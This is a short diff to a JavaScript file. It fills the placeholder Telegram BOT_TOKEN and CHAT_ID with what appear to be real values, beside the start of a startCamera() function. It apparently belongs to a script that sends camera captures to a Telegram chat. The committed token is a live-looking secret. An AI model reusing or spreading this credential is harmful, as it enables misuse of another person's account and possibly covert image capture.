@@ -1,5 +1,5 @@
-const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // 🔴 Replace with your Telegram Bot Token
-const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // 🔴 Replace with your Telegram Chat ID
+const BOT_TOKEN = '7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM';  // 🔴 Replace with your Telegram Bot Token
+const CHAT_ID = '878604830';      // 🔴 Replace with your Telegram Chat ID
 let stream;
 
 async function startCamera() {
